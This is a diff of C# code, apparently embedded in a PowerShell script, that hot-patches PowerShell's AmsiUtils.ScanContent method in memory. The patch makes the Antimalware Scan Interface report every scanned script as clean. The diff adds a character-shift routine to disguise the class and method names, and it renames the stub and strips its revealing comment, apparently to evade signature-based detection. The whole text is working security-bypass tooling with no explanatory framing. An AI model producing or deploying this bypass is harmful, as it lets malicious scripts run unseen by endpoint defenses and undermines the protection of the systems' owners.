@@ -5,18 +5,19 @@ using System.Management.Automation;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace Editor {
     public static class Methods {
         public static void Patch() {
-            MethodInfo original = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils").GetMethod("ScanContent", BindingFlags.NonPublic | BindingFlags.Static);
-            MethodInfo replacement = typeof(Methods).GetMethod("ScanContentStub", BindingFlags.NonPublic | BindingFlags.Static);
+            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
+            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
             Methods.Patch(original, replacement);
         }
 
         [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-        private static int ScanContentStub(string content, string metadata) {
-            return 1; //AMSI_RESULT_NOTDETECTED
+        private static int Dummy(string content, string metadata) {
+            return 1;
         }
 
         public static void Patch(MethodInfo original, MethodInfo replacement) {
@@ -67,6 +68,15 @@ namespace Editor {
             }
         }
 
+        private static string Transform(string input) {
+            StringBuilder builder = new StringBuilder(input.Length + 1);    
+            foreach(char c in input) {
+                char m = (char)((int)c - 1);
+                builder.Append(m);
+            }
+            return builder.ToString();
+        }
+
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
 
@@ -78,6 +88,9 @@ namespace Editor {
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
+        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
     }
 }
 "@
